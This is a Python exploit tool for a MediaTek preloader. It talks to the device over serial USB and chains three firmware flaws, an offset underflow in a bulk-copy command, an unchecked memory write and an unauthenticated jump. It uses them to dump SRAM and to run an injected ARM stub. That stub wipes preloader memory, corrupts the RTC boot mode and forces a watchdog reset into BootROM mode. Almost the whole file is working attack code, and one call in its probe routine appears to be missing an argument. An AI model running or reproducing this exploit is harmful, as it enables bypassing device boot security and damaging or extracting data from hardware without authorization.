#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
mtk_da.py  v2  —  preloader_a04br3 (0e8d:2000, META "AND_") 専用
================================================================================
【実読アセンブリ根拠 (preloader_a04br3 / 0x00000000-0x00005750 実読分)】
  entry  0x201018: SCTLR で MMU/D-cache/I-cache を落とす (0x20105C-0x201068)
                   → 以後のアドレスは全部物理。VBAR 未設定・アボートハンドラ無し
  dispatch 0x202318: 同期 "AND_" (0x202322 memcpy / 0x202370 cmp / 0x202380 mvneq
                   = ビット反転返送) → コマンド 1byte ループ (0x2023D0 受信,
                   0x2023E6 エコー, 戻り値は未検査)
  0xA2 READ16 echo (0x202666→0x202208 r6=1) / 0xD0 READ16 (r6=0)
  0xA1 0xD2 WRITE16 echo (0x202672→0x202284 r6=1) / 0xD1 WRITE16 (r6=0)
  0xD4 WRITE32 (0x2026DA): addr&3 と cnt==0 だけ検査、len*4 は桁溢れのみ
  0xD7 BULK   (0x202450): addr/len/off を echo → 0x40001000 へ len byte 受信
                   → XOR16 を返送 → memmove(0x40001000,
                     0x40001000+(len-off), off)      ★ off>len でアンダーフロー
  0xD5 JUMP   (0x2025D8): addr を echo するが捨て、0x202620 で 0x40001000 に上書き
                   → [0x40000FF4]={0x58885168,1,0x40001000} を書いて 0x20D588 へ
                   ★ フラグ (*0x228384) が 1 でないと status 0x2001 で飛ばない。
                     フラグは 0xD7 成功時 (0x2025CC) に立つ。
  ★ 書き込み系にチェックサム無し。署名検証も無し。

【モード】
  --sram dump : クリティカル C-01 (0xD7 off アンダーフロー) で 0x40001000 未満の
                SRAM を 0x40001000 へ複製してから吸い出す。複製が効かない環境では
                自動で直読みへフォールバック。
  --brom      : クリティカル C-02 (0xD4 無検証書込) で 0x40001000 に ARM スタブを
                置き、C-01 (0xD7) で先頭 4byte を確定 + ジャンプフラグを立て、
                C-03 (0xD5 無認証ジャンプ) で移譲。スタブが RAM を破壊し RTC 不正
                モード + WDT_SWRST を叩いて BROM へ落とす。

【注意】
  - 115200 固定。0xD4 は 1 word ごとに echo が返るので大量書込は遅い。
  - 0x40001000 が書けるかは --probe で先に確認できる。
================================================================================
"""

import argparse
import os
import struct
import sys
import time
from datetime import datetime

SERIAL_CLS = None
LIST_PORTS = None


class LinkError(Exception):
    pass


def load_serial():
    global SERIAL_CLS, LIST_PORTS
    try:
        import serial as s
    except ImportError:
        raise LinkError("pyserial 未導入 -> pip install pyserial")
    if not hasattr(s, "Serial"):
        raise LinkError("import serial が pyserial ではありません")
    from serial.tools import list_ports as lp
    LIST_PORTS = lp
    SERIAL_CLS = s.Serial
    return True


MTK_VID = 0x0E8D
PRE_PIDS = (0x2000, 0x2001, 0x201C, 0x3000, 0x2003, 0x201D, 0x6000, 0x20FF)
BROM_PIDS = (0x0003, 0x0006, 0x0007)
KW = ("mtk", "mediatek", "preloader", "vcom", "cdc", "usb port", "brom")

# --- 0x202318 のディスパッチ表どおり ---
MAGIC = b"AND_"          # 0x202322 の memcpy 元。一致時はビット反転が返る
CMD_READ16 = 0xA2        # 0x202666 -> 0x202208(1)  echo 付き読み出し
CMD_WRITE16 = 0xA1       # 0x202672 -> 0x202284(1)  echo 付き書き込み
CMD_WRITE32 = 0xD4       # 0x2026DA
CMD_JUMP = 0xD5          # 0x2025D8  飛び先は常に 0x40001000
CMD_BULK = 0xD7          # 0x202450

SYNC_BYTE_TO = 0.5
SYNC_GAP = 0.05
SYNC_BOOT_DELAY = 0.8

BAUD = 115200
IO_TO = 1.0
WR_TO = 6.0

STAGE = 0x40001000
STAGE_LIMIT = 0x40000          # 0x20255C cmp.w r11,#0x40000
STUB = STAGE
PARAM_BLOCK = 0x40000FF4       # 0x202768 のリテラル

RTC_BASE = 0x10003000
RTC_BBPU = RTC_BASE + 0x08
RTC_PDN1 = RTC_BASE + 0x1C
RTC_KEY = 0x43000000
WDT_MODE = 0x10007000
WDT_RESTART = 0x10007008
WDT_SWRST = 0x10007014
WDT_MODE_KEY = 0x22000000
WDT_RESTART_KEY = 0x1971
WDT_SWRST_KEY = 0x1209
MODE_MASK = 0x3F
BAD_MODE = 0x3F

SCRUB_START = 0x00200000       # preloader 本体 (.gfh 0x200D00-0x248764) を潰す
SCRUB_WORDS = 0x13000          # 0x200000-0x24C000

BROM_ENTRIES = (0x0, 0x8, 0x100)

READ_CHUNK = 0x400             # 0xA2 1 回の halfword 数 (=0x800 byte)


def log(msg, tag="*"):
    print(f"[{tag}] {msg}", flush=True)


# ================================================================
# ポート
# ================================================================
def find_mtk_ports():
    out = []
    if LIST_PORTS is None:
        return out
    try:
        for p in LIST_PORTS.comports():
            if p.vid == MTK_VID and p.pid is not None:
                out.append((p.device, p.pid, p.description or ""))
    except Exception:
        pass
    return out


def find_pids(pids):
    return [x for x in find_mtk_ports() if x[1] in pids]


def fallback_ports():
    out = []
    if LIST_PORTS is None:
        return out
    try:
        for p in LIST_PORTS.comports():
            d = (p.description or "").lower()
            if p.vid == MTK_VID or any(k in d for k in KW):
                out.append((p.device, p.pid, p.description or ""))
    except Exception:
        pass
    return out


def wait_for_pids(pids, timeout, label):
    end = time.monotonic() + timeout
    tick = 0
    while time.monotonic() < end:
        hit = find_pids(pids)
        if hit:
            return hit[0]
        tick += 1
        if tick % 20 == 0:
            log(f"{label} 待機中...", ".")
        time.sleep(0.05)
    return None


def dump_ports():
    log("現在のポート:", ".")
    for dev, pid, desc in find_mtk_ports():
        m = "PRE" if pid in PRE_PIDS else ("BROM" if pid in BROM_PIDS else "-")
        log(f"  {dev} 0e8d:{pid:04x} [{m}] {desc}", ".")
    for dev, pid, desc in fallback_ports():
        if (dev, pid, desc) not in find_mtk_ports():
            log(f"  {dev} (pid不明) {desc}", ".")


def resolve_port(name):
    ports = find_mtk_ports() or fallback_ports()
    low = name.lower()
    for dev, pid, desc in ports:
        if dev.lower() == low:
            return dev
    for dev, pid, desc in ports:
        if low in (desc or "").lower():
            return dev
    return None


# ================================================================
# リンク
# ================================================================
class Link:
    def __init__(self, port):
        self.port = port
        self.ser = None
        self.dead = False

    def open(self):
        last = None
        for _ in range(6):
            try:
                try:
                    self.ser = SERIAL_CLS(port=self.port, baudrate=BAUD,
                                          timeout=IO_TO, write_timeout=WR_TO)
                except TypeError:
                    self.ser = SERIAL_CLS(port=self.port, baudrate=BAUD, timeout=IO_TO)
                break
            except Exception as e:
                last = e
                self.ser = None
                time.sleep(0.4)
        else:
            raise LinkError(f"open 失敗 {self.port}: {last}")
        try:
            self.ser.reset_input_buffer()
            self.ser.reset_output_buffer()
        except Exception:
            pass
        for a in ("dtr", "rts"):
            try:
                setattr(self.ser, a, True)
            except Exception:
                pass
        time.sleep(SYNC_BOOT_DELAY)
        return self

    def close(self):
        if self.ser is not None:
            try:
                self.ser.close()
            finally:
                self.ser = None

    def __enter__(self):
        return self.open()

    def __exit__(self, *e):
        self.close()

    def flush_in(self):
        if self.ser:
            try:
                self.ser.reset_input_buffer()
            except Exception:
                pass

    def rx(self, n, timeout=None):
        if n == 0:
            return b""
        t = IO_TO if timeout is None else timeout
        end = time.monotonic() + t
        buf = bytearray()
        while len(buf) < n:
            left = end - time.monotonic()
            if left <= 0:
                break
            try:
                self.ser.timeout = min(left, 0.4)
                c = self.ser.read(n - len(buf))
            except Exception as e:
                self.dead = True
                raise LinkError(f"rx: {e}")
            if c:
                buf += c
        return bytes(buf)

    def tx(self, data):
        try:
            self.ser.write(data)
            self.ser.flush()
        except Exception as e:
            raise LinkError(f"tx: {e}")

    def echo(self, data, tag="e", timeout=None):
        self.tx(data)
        got = self.rx(len(data), timeout)
        if got != data:
            raise LinkError(f"{tag}: {data.hex()} != {got.hex()}")

    def u16(self, timeout=None):
        d = self.rx(2, timeout or IO_TO)
        if len(d) != 2:
            raise LinkError(f"status short {len(d)}/2")
        return struct.unpack(">H", d)[0]

    # ---- 同期 (0x202348 のループ) ----
    def sync(self, retries=6):
        """'A','N','D','_' を送り、各バイトのビット反転が返ることを確認する。
        0x202380 が一致時に mvneq r2,r2 で反転値を返す仕様に合わせる。"""
        for _ in range(retries):
            self.flush_in()
            ok = True
            for b in MAGIC:
                self.tx(bytes([b]))
                r = self.rx(1, SYNC_BYTE_TO)
                if r != bytes([b ^ 0xFF]):
                    ok = False
                    break
            if ok:
                return True
            time.sleep(SYNC_GAP)
        raise LinkError("sync 失敗 (AND_ 不一致)")

    # ---- 0xA2 : 16bit 読み出し (0x202208 r6=1) ----
    def read16(self, addr, cnt, timeout=None):
        if addr & 1:
            raise LinkError("read16: 2byte 整列必須")
        if cnt <= 0:
            raise LinkError("read16: cnt 0")
        self.echo(bytes([CMD_READ16]), "r16")
        self.echo(struct.pack(">I", addr & 0xFFFFFFFF), "r16.a")
        self.echo(struct.pack(">I", cnt & 0xFFFFFFFF), "r16.n")
        d = self.rx(cnt * 2, timeout or 10.0)
        if len(d) != cnt * 2:
            raise LinkError(f"read16 short {len(d)}/{cnt * 2}")
        return d

    def read32(self, addr, timeout=5.0):
        return struct.unpack(">I", self.read16(addr, 2, timeout))[0]

    def read_block(self, addr, n, timeout=20.0):
        out = bytearray()
        while len(out) < n:
            k = min(READ_CHUNK * 2, n - len(out))
            k -= k & 1
            if k == 0:
                break
            out += self.read16(addr + len(out), k // 2, timeout)
        return bytes(out)

    # ---- 0xA1 : 16bit 書き込み (0x202284 r6=1) ----
    def write16(self, addr, data):
        if addr & 1:
            raise LinkError("write16: 2byte 整列必須")
        cnt = len(data) // 2
        if cnt == 0:
            raise LinkError("write16: 空")
        self.echo(bytes([CMD_WRITE16]), "w16")
        self.echo(struct.pack(">I", addr & 0xFFFFFFFF), "w16.a")
        self.echo(struct.pack(">I", cnt), "w16.n")
        st = self.u16()
        if st != 0:
            raise LinkError(f"write16 status 0x{st:04X}")
        for i in range(cnt):
            self.echo(data[i * 2:i * 2 + 2], "w16.d")
        st = self.u16()
        if st != 0:
            raise LinkError(f"write16 final 0x{st:04X}")

    # ---- 0xD4 : 32bit 書き込み (0x2026DA) ----
    def write32(self, addr, vals, timeout=8.0):
        if addr & 3:
            raise LinkError("write32: 4byte 整列必須")
        self.echo(bytes([CMD_WRITE32]), "w32")
        self.echo(struct.pack(">I", addr & 0xFFFFFFFF), "w32.a")
        self.echo(struct.pack(">I", len(vals)), "w32.n")
        st = self.u16(timeout)
        if st != 0:
            raise LinkError(f"write32 status 0x{st:04X}")
        for v in vals:
            self.echo(struct.pack(">I", v & 0xFFFFFFFF), "w32.d", timeout)
        st = self.u16(timeout)
        if st != 0:
            raise LinkError(f"write32 final 0x{st:04X}")

    # ---- 0xD7 : ステージング (0x202450) ----
    def bulk(self, addr_word, payload, off, timeout=15.0):
        """addr_word は echo されるだけ (0x20249E で 0x40001000 に潰される)。
        payload を 0x40001000 へ len byte 受信し、XOR16 が返り、
        memmove(0x40001000, 0x40001000+(len-off), off) が走る。
        戻り値は最終 status。"""
        n = len(payload)
        self.echo(bytes([CMD_BULK]), "bulk")
        self.echo(struct.pack(">I", addr_word & 0xFFFFFFFF), "bulk.a")
        self.echo(struct.pack(">I", n), "bulk.n")
        self.echo(struct.pack(">I", off & 0xFFFFFFFF), "bulk.o")
        st = self.u16(timeout)
        if st != 0:
            raise LinkError(f"bulk pre 0x{st:04X}")
        self.tx(payload)
        ck = self.u16(timeout)          # 0x20251A の XOR16
        st = self.u16(timeout)          # 0x20259E の最終 status
        return st, ck

    # ---- 0xD5 : ジャンプ (0x2025D8) 飛び先は常に 0x40001000 ----
    def jump(self, timeout=3.0):
        self.echo(bytes([CMD_JUMP]), "jmp")
        self.echo(struct.pack(">I", STUB), "jmp.a")
        return self.u16(timeout)


# ================================================================
# C-01 : off > len アンダーフローで [addr, addr+n) を 0x40001000 へ複製
# ================================================================
def stage_below(link, addr, n):
    if n <= 0 or n > STAGE_LIMIT - 4:
        raise LinkError("stage_below: 長さ不正")
    off = STAGE - addr              # > 0
    if off > 0x40000000:
        raise LinkError("stage_below: off 過大")
    payload = b"\xDE\xAD\xBE\xEF"
    st, ck = link.bulk(addr, payload, off + len(payload))
    if st != 0:
        raise LinkError(f"0xD7 status 0x{st:04X}")
    return ck


def stage_below_verified(link, addr, n):
    """複製できたかを先頭 4byte の変化で判定する。"""
    if addr + 4 > STAGE:
        raise LinkError("stage_below_verified: 範囲外")
    before = link.read_block(STAGE, 4, 4.0)
    stage_below(link, addr, n)
    after = link.read_block(STAGE, 4, 4.0)
    return before != after


# ================================================================
# ARM エンコーダ / スタブ
# ================================================================
B_SELF = 0xEAFFFFFE
I_DCCIALL = 0xEE070F1E      # mcr p15,0,r0,c7,c14,0
I_ICIALLU = 0xEE070F15      # mcr p15,0,r0,c7,c5,0
I_DSB = 0xEE070F9A          # mcr p15,0,r0,c7,c10,4


def _movw(r, v):
    v &= 0xFFFF
    return 0xE3000000 | (((v >> 12) & 0xF) << 16) | ((r & 0xF) << 12) | (v & 0xFFF)


def _movt(r, v):
    v = (v >> 16) & 0xFFFF
    return 0xE3400000 | (((v >> 12) & 0xF) << 16) | ((r & 0xF) << 12) | (v & 0xFFF)


def _str_off(rt, rn, off):
    return 0xE5800000 | ((rn & 0xF) << 16) | ((rt & 0xF) << 12) | (off & 0xFFF)


def _mvn(r, imm8=0):
    return 0xE3E00000 | ((r & 0xF) << 12) | (imm8 & 0xFF)


def words_to_bytes(w):
    return b"".join(struct.pack("<I", x & 0xFFFFFFFF) for x in w)


def build_stub(scrub_start=SCRUB_START, scrub_words=SCRUB_WORDS, bad_mode=BAD_MODE):
    """0x40001000 用。ARM 状態で入る前提。
       1 cache を落として自分を可視化
       2 [scrub_start, +scrub_words*4) を 0xFFFFFFFF で埋める
       3 RTC BBPU unlock -> PDN1[5:0]=bad -> lock
       4 WDT_MODE / RESTART / SWRST
       5 b ."""
    w = [I_DCCIALL, I_ICIALLU, I_DSB]
    w.append(_movw(4, scrub_start & 0xFFFF))
    w.append(_movt(4, scrub_start))
    w.append(_mvn(5, 0))                        # r5 = 0xFFFFFFFF
    w.append(_movw(6, scrub_words & 0xFFFF))
    w.append(_movt(6, scrub_words))
    w.append(0xE4845004)                        # str r5, [r4], #4
    w.append(0xE2566001)                        # subs r6, r6, #1
    w.append(0x1AFFFFFC)                        # bne -> str
    w.append(I_DSB)

    w.append(_movw(0, RTC_BASE & 0xFFFF))
    w.append(_movt(0, RTC_BASE))
    w.append(_movw(1, RTC_KEY & 0xFFFF))
    w.append(_movt(1, RTC_KEY))
    w.append(_str_off(1, 0, 0x08))              # BBPU = key
    w.append(_movw(1, bad_mode & 0xFFFF))
    w.append(_movt(1, 0))
    w.append(_str_off(1, 0, 0x1C))              # PDN1 = bad
    w.append(_movw(1, 0))
    w.append(_str_off(1, 0, 0x08))              # BBPU = 0

    w.append(_movw(0, WDT_MODE & 0xFFFF))
    w.append(_movt(0, WDT_MODE))
    w.append(_movw(1, WDT_RESTART_KEY))
    w.append(_str_off(1, 0, 0x08))              # 先に蹴る
    w.append(_movw(1, (WDT_MODE_KEY | 0x14) & 0xFFFF))
    w.append(_movt(1, WDT_MODE_KEY | 0x14))
    w.append(_str_off(1, 0, 0x00))
    w.append(_movw(1, WDT_RESTART_KEY))
    w.append(_str_off(1, 0, 0x08))
    w.append(_movw(1, WDT_SWRST_KEY))
    w.append(_str_off(1, 0, 0x14))
    w.append(B_SELF)
    return words_to_bytes(w)


# ================================================================
# probe
# ================================================================
def probe(link):
    for name, a in (("STAGE", STAGE), ("PARAM_BLOCK", PARAM_BLOCK),
                    ("RTC_PDN1", RTC_PDN1), ("WDT_MODE", WDT_MODE)):
        try:
            log(f"READ {name} @0x{a:08X} = 0x{link.read32(a):08X}", "+")
        except LinkError as e:
            log(f"READ {name} @0x{a:08X} NG: {e}", "!")
    try:
        link.write32(STUB, [0xEAFFFFFE])
        back = link.read32(STUB)
        log(f"STAGE 書込/読戻し {'OK' if back == 0xEAFFFFFE else '不一致'} "
            f"(0x{back:08X})", "+" if back == 0xEAFFFFFE else "!")
    except LinkError as e:
        log(f"STAGE 書込 NG: {e}", "!")
    try:
        stage_below(STUB, 4)
        log("C-01 (0xD7 off>len) 実行可", "+")
    except LinkError as e:
        log(f"C-01 NG: {e}", "!")
    for b in (0x00200000, 0x00201000, 0x000C0000):
        try:
            log(f"pre_base 候補 0x{b:08X} = 0x{link.read32(b):08X}", ".")
        except LinkError as e:
            log(f"pre_base 候補 0x{b:08X} NG: {e}", ".")


# ================================================================
# --sram dump
# ================================================================
def sram_dump(link, start, length, out_path, use_vuln=True):
    end = start + length
    log(f"SRAM dump 0x{start:08X}-0x{end:08X} ({length} bytes)  "
        f"C-01={'on' if use_vuln else 'off'}", "#")
    buf = bytearray()
    vuln_ok = bool(use_vuln)
    cur = start
    try:
        while cur < end:
            if vuln_ok and cur < STAGE:
                n = min(0x1000, end - cur, STAGE - cur)
                try:
                    moved = stage_below_verified(link, cur, n)
                    if not moved:
                        raise LinkError("0xD7 で複製されない (0x21B5EC が 0)")
                    buf += link.read_block(STAGE, n)
                    cur += n
                    log(f"  C-01 0x{cur - n:08X} +{n}", ".")
                    continue
                except LinkError as e:
                    log(f"C-01 失敗 ({e}) -> 直読みへフォールバック", "!")
                    vuln_ok = False
            n = min(0x1000, end - cur)
            buf += link.read_block(cur, n)
            cur += n
            log(f"  read 0x{cur - n:08X} +{n}", ".")
    except LinkError as e:
        log(f"dump 中断 @0x{cur:08X}: {e}", "!")
    with open(out_path, "wb") as f:
        f.write(bytes(buf))
    log(f"{len(buf)} bytes -> {out_path}", "+")
    head = bytes(buf[:64])
    for i in range(0, len(head), 16):
        log(f"  {start + i:08X}  {head[i:i+16].hex(' ')}", ".")
    return 0 if len(buf) == length else 1


# ================================================================
# --brom
# ================================================================
def brom(link, bad_mode, scrub_start, scrub_words, entries, wait):
    stub = build_stub(scrub_start, scrub_words, bad_mode)
    words = list(struct.unpack("<%dI" % (len(stub) // 4), stub))
    log(f"スタブ {len(stub)} bytes", ".")

    # 1) 前提: 0xD5 はフラグが 1 でないと飛ばない (0x2025F2)。
    #    フラグは 0xD7 成功時に立つ (0x2025CC)。C-01 で先に立てておく。
    log("C-01 (0xD7 off>len) でステージング経路とフラグを確保", ".")
    stage_below(link, STUB, 4)

    # 2) C-02: 先頭 4byte 以外のスタブ本体を 0xD4 で書く
    log("C-02 (0xD4 無検証書込) でスタブ本体を配置", ".")
    if len(words) > 1:
        link.write32(STUB + 4, words[1:])
    back = link.read_block(STUB + 4, len(stub) - 4, 20.0)
    if back != stub[4:]:
        log("スタブ読戻し不一致", "!")
        return False
    log("スタブ本体 一致", "+")

    # 3) C-01: 先頭 4byte を len==off の恒等コピーで確定 (フラグも再設定)
    log("C-01 (0xD7 len==off) で先頭ワードを確定", ".")
    st, _ = link.bulk(STUB, stub[:4], 4)
    if st != 0:
        log(f"0xD7 status 0x{st:04X}", "!")
        return False
    if link.read_block(STUB, 4, 4.0) != stub[:4]:
        log("先頭ワード不一致", "!")
        return False
    log("スタブ完成", "+")

    # 4) C-03: 無認証ジャンプ
    log("C-03 (0xD5) -> 0x40001000", ".")
    try:
        st = link.jump()
        log(f"jump status=0x{st:04X}", ".")
        if st == 0x2001:
            log("フラグ未設定。0xD7 をやり直して再試行", ".")
            link.bulk(STUB, stub[:4], 4)
            st = link.jump()
            log(f"jump status=0x{st:04X}", ".")
    except LinkError as e:
        log(f"jump 応答なし (想定内): {e}", ".")

    hit = wait_for_pids(BROM_PIDS, wait, "BROM(0e8d:0003)")
    if hit:
        log(f"BROM 検出: {hit[0]} 0e8d:{hit[1]:04x}", "+")
        return True
    return False


def brom_jump(port, entries, wait):
    for e in entries:
        log(f"0xD5 -> 0x{e:08X} (生エントリ候補)", ".")
        try:
            l = Link(port).open()
        except LinkError as ex:
            log(f"open 失敗: {ex}", "!")
            return False
        try:
            l.sync()
            l.bulk(STUB, b"\x00\x00\x00\x00", 4)   # フラグを立てるだけ
            l.jump()
        except LinkError as ex:
            log(f"jump 応答なし: {ex}", ".")
        finally:
            try:
                l.close()
            except Exception:
                pass
        if wait_for_pids(BROM_PIDS, wait, "BROM"):
            return True
        if not wait_for_pids(PRE_PIDS, 3.0, "preloader 復帰"):
            log("preloader も BROM も見えない。挿し直しが必要", "!")
            return False
        log("preloader のまま。次候補へ", ".")
    return False


# ================================================================
# main
# ================================================================
def main(argv=None):
    ap = argparse.ArgumentParser(description="preloader(META AND_) SRAM dump / BROM 落とし")
    ap.add_argument("--port", default=None)
    ap.add_argument("--wait", type=float, default=60.0)
    ap.add_argument("--ports", action="store_true")
    ap.add_argument("--probe", action="store_true")
    ap.add_argument("--sram", choices=("dump",), default=None,
                    help="--sram dump : C-01 でステージングしてから SRAM を吸い出す")
    ap.add_argument("--sram-start", type=lambda s: int(s, 0), default=0x40000000)
    ap.add_argument("--sram-len", type=lambda s: int(s, 0), default=0x40000)
    ap.add_argument("--out", default=None)
    ap.add_argument("--no-vuln", action="store_true", help="C-01 を使わず直読みのみ")
    ap.add_argument("--brom", action="store_true", help="C-02+C-01+C-03 で BROM へ落とす")
    ap.add_argument("--brom-entry", default=None,
                    help="生ジャンプ候補 (既定 0x0,0x8,0x100)")
    ap.add_argument("--brom-wait", type=float, default=8.0)
    ap.add_argument("--bad-mode", type=lambda s: int(s, 0), default=BAD_MODE)
    ap.add_argument("--scrub-start", type=lambda s: int(s, 0), default=SCRUB_START)
    ap.add_argument("--scrub-words", type=lambda s: int(s, 0), default=SCRUB_WORDS)
    ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args(argv)

    try:
        load_serial()
    except LinkError as e:
        print(f"[!] {e}")
        return 2

    if a.ports:
        dump_ports()
        return 0

    if not a.sram and not a.brom and not a.probe:
        ap.print_help()
        return 2

    entries = ([int(x, 0) for x in a.brom_entry.replace(" ", "").split(",") if x]
               if a.brom_entry else list(BROM_ENTRIES))

    port = resolve_port(a.port) if a.port else None
    if a.port and not port:
        print(f"ポート '{a.port}' 解決不可")
        dump_ports()
        return 2
    if not port:
        hit = wait_for_pids(PRE_PIDS, a.wait, "preloader")
        if not hit:
            log("preloader 未検出", "!")
            dump_ports()
            return 2
        port = hit[0]
        log(f"preloader: {port} 0e8d:{hit[1]:04x}", "+")

    if a.dry_run:
        print(f"port={port} sram={a.sram} brom={a.brom} "
              f"start=0x{a.sram_start:X} len=0x{a.sram_len:X} "
              f"vuln={'off' if a.no_vuln else 'on'} entries={['0x%X' % e for e in entries]}")
        print(f"stub bytes={len(build_stub(a.scrub_start, a.scrub_words, a.bad_mode))}")
        return 0

    with Link(port) as l:
        try:
            l.sync()
            log("sync OK (AND_)", "+")
        except LinkError as e:
            log(f"sync 失敗: {e}", "!")
            return 1

        if a.probe:
            probe(l)
            return 0

        if a.sram == "dump":
            out = a.out or f"sram_{datetime.now():%Y%m%d_%H%M%S}.bin"
            return sram_dump(l, a.sram_start, a.sram_len, out,
                             use_vuln=not a.no_vuln)

        if a.brom:
            ok = brom(l, a.bad_mode, a.scrub_start, a.scrub_words,
                      entries, a.brom_wait)
            try:
                l.close()
            except Exception:
                pass
            if not ok:
                if wait_for_pids(PRE_PIDS, 10.0, "preloader 復帰"):
                    hit = find_pids(PRE_PIDS)
                    if hit:
                        log("生エントリへ 0xD5 を試行", ".")
                        ok = brom_jump(hit[0][0], entries, a.brom_wait)
            if ok:
                log("=== BROM 到達 ===", "#")
                for dev, pid, desc in find_pids(BROM_PIDS):
                    log(f"  {dev} 0e8d:{pid:04x} {desc}", "+")
                log("BROM は独自プロトコル。DA 投入前に同期をやり直してください。", ".")
                return 0
            log("BROM に落ちず", "!")
            return 1
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n中断")
        sys.exit(130)
